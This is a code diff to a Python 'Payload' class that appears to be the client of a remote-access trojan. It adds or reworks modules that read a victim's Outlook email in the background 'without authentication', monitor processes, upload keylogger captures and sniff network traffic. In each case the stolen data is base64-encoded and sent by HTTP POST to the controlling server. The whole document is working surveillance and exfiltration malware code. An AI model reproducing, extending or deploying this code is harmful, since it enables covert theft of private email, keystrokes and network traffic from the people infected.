@@ -682,10 +682,7 @@ class Payload():
         Access Outlook email in the background without authentication
 
         `Required`
-        :param str mode:    count, dump, search, results
-
-        `Optional`
-        :param int n:       target number of emails (upload mode only)
+        :param str mode:    installed, run, count, search, upload
 
         """
         if 'outlook' not in globals():
@@ -700,18 +697,23 @@ class Payload():
         else:
             try:
                 mode, _, arg   = str(args).partition(' ')
-                if hasattr(globals()['outlook'] % mode):
-                    if 'dump' in mode or 'upload' in mode:
-                        self.handlers['outlook'] = threading.Thread(target=getattr(globals()['outlook'], mode), kwargs={'n': arg}, name=time.time())
-                        self.handlers['outlook'].daemon = True
-                        self.handlers['outlook'].start()
-                        return "Dumping emails from Outlook inbox"
+                if hasattr(globals()['outlook'], mode):
+                    if 'run' in mode:
+                        self.handlers['outlook'] = globals()['outlook'].run()
+                        return "Fetching emails from Outlook inbox..."
+                    elif 'upload' in mode:
+                        results = globals()['outlook'].results
+                        if len(results):
+                            host, port = self.connection.getpeername()
+                            data = {'txt': base64.b64encode(json.dumps(results))}
+                            globals()['post']('http://{}:{}'.format(host, port+3), json=data)
+                            return "Upload of Outlook emails complete"
                     elif hasattr(globals()['outlook'], mode):
                         return getattr(globals()['outlook'], mode)()
                     else:
                         return "Error: invalid mode '%s'" % mode
                 else:
-                    return "usage: outlook [mode]\n    mode: count, dump, search, results"
+                    return self.outlook.usage
             except Exception as e:
                 log("{} error: {}".format(self.email.func_name, str(e)))
 
@@ -752,7 +754,7 @@ class Payload():
         Utility method for interacting with processes
 
         `Required`
-        :param str mode:    block, list, monitor, kill, search
+        :param str mode:    block, list, monitor, kill, search, upload
 
         `Optional`
         :param str args:    arguments specific to the mode
@@ -761,18 +763,23 @@ class Payload():
         try:
             if 'process' not in globals():
                 self.load('process')
-            if not args:
-                if hasattr(globals()['process'], 'usage'):
-                    return globals()['process'].usage
-                elif hasattr(self.process, 'usage'):
-                    return self.process.usage
-                else:
-                    return "usage: process <mode>\n    mode: block, list, search, kill, monitor"
-            cmd, _, action = str(args).partition(' ')
-            if hasattr(globals()['process'], cmd):
-                return getattr(globals()['process'], cmd)(action) if action else getattr(globals()['process'], cmd)()
-            else:
-                return "usage: process <mode>\n    mode: block, list, search, kill, monitor"
+            if args:
+                cmd, _, action = str(args).partition(' ')
+                if 'monitor' in cmd:
+                    self.handlers['process_monitor'] = globals()['process'].monitor(action)
+                    return "Monitoring process creation for keyword: {}".format(action)
+                elif 'upload' in cmd:
+                    log = globals()['process'].log.getvalue()
+                    if len(log):
+                        data = {'log': base64.b64encode(log)}
+                        host, port = self.connection.getpeername()
+                        globals()['post']('http://{}:{}'.format(host, port+3), json=data)
+                        return "Process log upload complete"
+                    else:
+                        return "Process log is empty"
+                elif hasattr(globals()['process'], cmd):
+                    return getattr(globals()['process'], cmd)(action) if action else getattr(globals()['process'], cmd)()
+            return "usage: process <mode>\n    mode: block, list, search, kill, monitor"
         except Exception as e:
             log("{} error: {}".format(self.process.func_name, str(e)))
 
@@ -877,7 +884,7 @@ class Payload():
                 host, port = self.connection.getpeername()
                 globals()['post']('http://{}:{}'.format(host, port + 3), json={'txt': data})
                 globals()['keylogger'].logs.reset()
-                return 'Upload complete'
+                return 'Keystroke log upload complete'
             elif 'status' in mode:
                 return locals()['status']()        
             else:
@@ -936,30 +943,40 @@ class Payload():
         except Exception as e:
             log("{} error: {}".format(self.persistence.func_name, str(e)))
 
-    @config(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer mode=[str] time=[int]')
+    @config(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer [mode]')
     def packetsniffer(self, args):
         """ 
         Capture traffic on local network
 
         `Required`
-        :param str mode:        ftp, pastebin
-        :param int seconds:     duration in seconds
+        :param str args:        run, stop, upload
         
         """
         try:
             if 'packetsniffer' not in globals():
                 self.load('packetsniffer')
-            args = globals()['kwargs'](args)
-            if 'mode' not in args or args['mode'] not in ('ftp', 'pastebin'):
-                return "keyword argument 'mode' is missing or invalid (use 'ftp' or 'pastebin')"
-            else:
-                mode = args['mode']
-            if 'time' not in args or not str(args['time']).isdigit():
-                length = 30
-            else:
-                length = args['time']
-            self.handlers['packetsniffer'] = globals()['packetsniffer'](mode, seconds=length)
-            return 'Capturing network traffic for {} seconds and uploading via {}'.format(length, mode)
+            args = str(args).split()
+            if len(args):
+                mode = args[0]
+                if 'run' in mode:
+                    globals()['packetsniffer'].flag.set()
+                    self.handlers['packetsniffer'] = globals()['packetsniffer'].run()
+                    return "Network traffic capture started"
+                elif 'stop' in mode:
+                    globals()['packetsniffer'].flag.clear()
+                    return "Network traffic captured stopped"
+                elif 'upload' in mode:
+                    log = globals()['packetsniffer'].log.getvalue()
+                    if len(log):
+                        globals()['packetsniffer'].log.reset()
+                        data = {'pcap': base64.b64encode(log)}
+                        host, port = self.connection.getpeername()
+                        globals()['post']('http://{}:{}'.format(host, port+3), json=data)
+                        return "Network traffic log upload complete"
+                    else:
+                        return "Network traffic log is empty"
+                else:
+                    return self.packetsniffer.usage
         except Exception as e:
             log("{} error: {}".format(self.packetsniffer.func_name, str(e)))
 
